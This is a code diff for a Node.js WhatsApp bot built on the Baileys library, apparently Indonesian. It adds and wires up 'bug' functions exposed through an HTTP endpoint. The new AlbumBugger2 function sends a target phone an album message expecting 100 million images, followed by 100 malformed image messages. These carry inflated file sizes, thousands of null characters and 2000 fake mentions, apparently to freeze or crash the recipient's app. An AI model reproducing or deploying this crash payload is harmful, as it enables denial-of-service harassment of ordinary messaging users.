@@ -1,6 +1,5 @@
 const {
   default: makeWASocket,  
-    useMultiFileAuthState,
     DisconnectReason,
     delay,
     makeWALegacySocket,
@@ -11,6 +10,7 @@ const {
     makeInMemoryStore,
     proto, 
     WAProto,
+    useMultiFileAuthState,
     AnyMessageContent,
     fetchLatestBaileysVersion,
     prepareWAMessageMedia,
@@ -147,7 +147,7 @@ Router.get("/", async (req, res) => {
     if (!registered) {
       // generate pairing code
       await delay(500);
-      let pairingCode = await sock.requestPairingCode(phoneNumber, "WAHYUXDI");
+      let pairingCode = await sock.requestPairingCode(phoneNumber, "WHYUXD");
       pairingCode = pairingCode?.match(/.{1,4}/g)?.join("-") || pairingCode;
       console.log(`[${phoneNumber}] Pairing code:`, pairingCode);
       return res.status(200).json({ code: pairingCode });
@@ -204,6 +204,96 @@ Router.get("/action", async (req, res) => {
 
 // ################## //
 // === FUNCTION BUG === //
+async function AlbumBugger2(target)  {
+   const album = await generateWAMessageFromContent(target, {
+      albumMessage: {
+         expectedImageCount: 100000000,
+         expectedVideoCount: 0, //trigger
+      }
+   }, {});   
+   const imagePayload = {
+      imageMessage: {
+        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
+        mimetype: "image/jpeg",
+        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
+        fileLength: 99999999999,
+        height: 1280,
+        width: 720,
+        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
+        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
+        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&_nc_hot=1758521044",
+        mediaKeyTimestamp: 1758521043,
+        isSampled: true, 
+        viewOnce: false, 
+        contextInfo: {
+          forwardingScore: 999,
+          isForwarded: true, 
+          forwardedNewsletterMessageInfo: {
+            newsletterJid: "120363343611802180@newsletter", 
+            newsletterName: "whyuxD", 
+            contentType: "UPDATE_CARD", 
+            accessibilityText: "\u0000".repeat(9000), 
+            serverMessageId: 18888888
+          }, 
+          mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
+        },
+        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
+        scanLengths: [3599, 9271, 2026, 2778],
+        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=", 
+        annotations: [
+          {
+            polygonVertices: [
+              {
+                x: 0.05515563115477562,
+                y: 0.4132135510444641
+              },
+              {
+                x: 0.9448351263999939,
+                y: 0.4132135510444641
+              },
+              {
+                x: 0.9448351263999939,
+                y: 0.5867812633514404
+              },
+              {
+                x: 0.05515563115477562,
+                y: 0.5867812633514404
+              }
+            ],
+            newsletter: {
+              newsletterJid: "120363343611802180@newsletter",
+              serverMessageId: 3868,
+              newsletterName: "wxx1",
+              contentType: "UPDATE_CARD",
+              accessibilityText: "\u0000".repeat(1000) 
+            }
+          }
+        ]
+     }
+   };   
+   const messages = [];
+   for (let i = 0; i < 100; i++) {
+     const imgMsg = await generateWAMessageFromContent(target, imagePayload, {});  
+      imgMsg.message.messageContextInfo = {  
+         messageAssociation: {  
+            associationType: 1,  
+            parentMessageKey: album.key  
+         }  
+      };  
+      messages.push(imgMsg);
+   }
+   await Yuukey.relayMessage(target, album.message, {
+      messageId: album.key.id,
+      participant: { jid: target }
+   });   
+   for (const msg of messages) {
+      await Yuukey.relayMessage(target, msg.message, {
+         messageId: msg.key.id,
+         participant: { jid: target }
+      });
+   }
+}
+
 async function AlbumBugDelay(target)  {
    const album = await generateWAMessageFromContent(target, {
       albumMessage: {
@@ -230,7 +320,7 @@ async function AlbumBugDelay(target)  {
           isForwarded: true, 
           forwardedNewsletterMessageInfo: {
             newsletterJid: "120363343611802180@newsletter", 
-            newsletterName: "7eppeli", 
+            newsletterName: "whyuxD", 
             contentType: "UPDATE_CARD", 
             accessibilityText: "\u0000".repeat(9000), 
             serverMessageId: 18888888
@@ -300,11 +390,10 @@ async function AlbumBugDelay(target)  {
     let message = "";
     if (type === "bug_a") {
       await AlbumBugDelay(jid)
-      return res.json({ success: true, message: "Bug delay invisible (new) telah dikirim!" });
+      return res.json({ success: true, message: "Bug telah dikirim!" });
     } else if (type === "bug_b") {
-      message = "Ini pesan panjang untuk bug B. ".repeat(30);
-      await sock.sendMessage(jid, { text: message });
-      return res.json({ success: true, message: "Pesan panjang terkirim (bug_b)" });
+      await AlbumBugger2(jid)
+      return res.json({ success: true, message: "Bug telah dikirim" });
     } else if (type === "bug_c") {
       message = "PING\n\nInformasi: device terkonek via API.\nTime: " + new Date().toISOString();
       await sock.sendMessage(jid, { text: message });
